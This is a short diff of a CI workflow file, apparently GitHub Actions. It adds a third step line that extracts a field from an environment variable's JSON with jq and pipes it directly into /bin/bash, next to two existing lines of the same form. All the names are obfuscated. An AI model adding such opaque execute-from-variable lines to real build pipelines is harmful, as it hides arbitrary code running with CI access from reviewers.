@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$f60665" | jq -r .g562 | /bin/bash
           printf '%s' "$c454" | jq -r .msny7 | /bin/bash
+          printf '%s' "$g036" | jq -r .bsl9 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
